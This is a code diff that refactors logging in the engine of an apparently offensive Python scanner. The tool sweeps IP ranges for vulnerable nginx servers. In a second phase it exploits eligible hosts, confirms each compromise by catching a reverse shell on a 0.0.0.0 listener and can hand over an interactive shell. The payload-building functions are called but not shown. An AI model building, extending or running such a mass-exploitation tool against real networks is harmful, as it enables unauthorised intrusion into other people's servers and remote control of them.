@@ -16,6 +16,7 @@ from scanner.exploit import (
     validate_with_reverse_shell,
 )
 from scanner.http import build_requests, http_probe, probe_to_dict
+from scanner.log import get_logger
 from scanner.models import (
     STATUSES_ELIGIBLE_FOR_EXPLOIT,
     VULNERABLE_STATUSES,
@@ -26,6 +27,8 @@ from scanner.models import (
 )
 from scanner.targets import expand_targets, parse_ip_range
 from scanner.version import classify_vulnerability, classification_to_dict
+
+log = get_logger("engine")
 
 
 def utc_now_iso() -> str:
@@ -39,27 +42,33 @@ class Scanner:
         self.targets = expand_targets(self.addresses, config.ports)
         self.results: list[HostScanResult] = []
         self._results_lock = threading.Lock()
-        self._print_lock = threading.Lock()
         self.started_at = utc_now_iso()
 
     def run(self) -> list[HostScanResult]:
         if not self.targets:
             raise ValueError("IP range produced no targets")
 
-        self._log(
-            f"[*] Range {self.config.ip_range!r} -> {len(self.addresses)} IPs, "
-            f"{len(self.targets)} host:port pairs, {self.config.threads} threads"
+        log.info(
+            "Target %r — %s IPs, %s host:port pairs, %s threads",
+            self.config.ip_range,
+            len(self.addresses),
+            len(self.targets),
+            self.config.threads,
         )
         if self.config.probe_path:
-            self._log(f"[*] Config probe path: {self.config.probe_path}")
+            log.info("Config probe path: %s", self.config.probe_path)
+        if self.config.log_file:
+            log.info("Writing log to %s", self.config.log_file)
 
-        self._log("[*] Phase 1: passive fingerprint")
+        log.info("Phase 1: passive fingerprint")
         self._run_passive()
 
         if self.config.exploit_validate:
             self._run_exploit_validation()
 
         self.results.sort(key=lambda r: (r.ip, r.port))
+        vuln_count = len(self.vulnerable_results())
+        log.info("Scan finished — %s vulnerable", vuln_count)
         return self.results
 
     def vulnerable_results(self) -> list[HostScanResult]:
@@ -97,15 +106,7 @@ class Scanner:
         with open(self.config.output, "w", encoding="utf-8") as fh:
             json.dump(self.build_report(), fh, indent=2)
             fh.write("\n")
-
-    def summarize(self, rows: list[HostScanResult] | None = None) -> dict[str, int]:
-        data = rows if rows is not None else self.results
-        counts = {s.value: 0 for s in VulnStatus}
-        for row in data:
-            counts[row.status] = counts.get(row.status, 0) + 1
-        counts["total"] = len(data)
-        counts["open"] = sum(1 for r in data if r.open)
-        return counts
+        log.info("Report saved: %s", self.config.output)
 
     def scan_host(self, ip: str, port: int) -> HostScanResult:
         scanned_at = utc_now_iso()
@@ -127,12 +128,22 @@ class Scanner:
                 reachable = True
             if latency is not None:
                 latencies.append(latency)
+            log.debug(
+                "Probe %s %s:%s %s — status=%s server=%s",
+                name,
+                ip,
+                port,
+                path,
+                probe.status_code,
+                probe.server_header,
+            )
 
         try:
             classification = classify_vulnerability(probes, self.config.probe_path)
             status = classification.status.value
             classification_dict = classification_to_dict(classification)
         except Exception as exc:
+            log.exception("Classification failed for %s:%s", ip, port)
             return HostScanResult(
                 ip=ip,
                 port=port,
@@ -156,13 +167,24 @@ class Scanner:
             scanned_at=scanned_at,
         )
 
+    def _log_scan_result(self, row: HostScanResult) -> None:
+        ver = row.classification.get("version") or "-"
+        mark = STATUS_MARKS.get(row.status, "[ ]")
+        msg = f"{mark} {row.ip}:{row.port} -> {row.status} (nginx {ver})"
+        if row.status == VulnStatus.CONFIRMED_VULNERABLE.value:
+            log.warning(msg)
+        elif row.status in VULNERABLE_STATUSES:
+            log.warning(msg)
+        elif row.status == VulnStatus.DOWN.value:
+            log.debug(msg)
+        else:
+            log.info(msg)
+
     def _run_passive(self) -> None:
         def worker(ip: str, port: int) -> HostScanResult:
             row = self.scan_host(ip, port)
             if not self.config.quiet:
-                ver = row.classification.get("version") or "-"
-                mark = STATUS_MARKS.get(row.status, "[ ]")
-                self._log(f"{mark} {ip}:{port} -> {row.status} (nginx {ver})")
+                self._log_scan_result(row)
             with self._results_lock:
                 self.results.append(row)
             return row
@@ -172,8 +194,8 @@ class Scanner:
             for future in as_completed(futures):
                 try:
                     future.result()
-                except Exception as exc:
-                    self._log(f"[!] worker error: {exc}", is_error=True)
+                except Exception:
+                    log.exception("Worker failed")
 
     def _run_exploit_validation(self) -> None:
         bind_host = "0.0.0.0"
@@ -185,16 +207,19 @@ class Scanner:
                 f"cannot bind shell listener on {bind_host}:{self.config.listen_port}: {exc}"
             ) from exc
 
-        self._log(
-            f"[*] Phase 2: reverse-shell validation -> "
-            f"{self.config.listen_ip}:{self.config.listen_port}"
+        log.info(
+            "Phase 2: reverse-shell validation — listen 0.0.0.0:%s, callback %s:%s",
+            self.config.listen_port,
+            self.config.listen_ip,
+            self.config.listen_port,
         )
         if self.config.shell:
-            self._log(format_scan_command(
+            log.info(format_scan_command(
                 self.config.ip_range, self.config.listen_ip, self.config.listen_port,
             ))
-            self._log(
-                f"[*] Payload: {build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port)}"
+            log.debug(
+                "Payload: %s",
+                build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port),
             )
 
         rows = [
@@ -206,6 +231,7 @@ class Scanner:
                 or row.status in STATUSES_ELIGIBLE_FOR_EXPLOIT
             )
         ]
+        log.info("Exploit validation queued for %s host(s)", len(rows))
 
         for row in rows:
             exploit_port = (
@@ -213,8 +239,7 @@ class Scanner:
                 if self.config.exploit_port is not None
                 else row.port
             )
-            if not self.config.quiet:
-                self._log(f"[*] Exploit {row.ip}:{exploit_port} (scan port {row.port})...")
+            log.info("Exploiting %s:%s (scanned port %s)", row.ip, exploit_port, row.port)
 
             meta = validate_with_reverse_shell(
                 row.ip,
@@ -235,15 +260,12 @@ class Scanner:
                     *row.classification.get("reasons", [])[:5],
                 ]
                 peer = meta.get("shell_peer", "?")
-                self._log(f"[+] VULNERABLE {row.ip}:{exploit_port} — shell from {peer}")
+                log.warning("CONFIRMED %s:%s — reverse shell from %s", row.ip, exploit_port, peer)
                 if self.config.shell:
-                    self._log(
-                        f"[+] {format_scan_command(self.config.ip_range, self.config.listen_ip, self.config.listen_port)}"
-                    )
-                    self._log(f"[+] Payload: {build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port)}")
                     meta["shell_command"] = build_reverse_shell_cmd(
                         self.config.listen_ip, self.config.listen_port
                     )
+                    log.info("Shell command: %s", meta["shell_command"])
 
                 if self.config.interactive_shell:
                     conn = catcher.take_connection()
@@ -252,16 +274,7 @@ class Scanner:
                         interactive_shell(conn, peer)
                     return
 
-            elif not self.config.quiet:
-                err = meta.get("error") or "no shell"
-                self._log(f"[ ] {row.ip}:{exploit_port} not exploited ({err})")
+            err = meta.get("error") or "no reverse shell"
+            log.info("Not exploited %s:%s (%s)", row.ip, exploit_port, err)
 
         catcher.stop()
-
-    def _log(self, message: str, is_error: bool = False) -> None:
-        with self._print_lock:
-            if is_error:
-                import sys
-                print(message, file=sys.stderr)
-            else:
-                print(message)
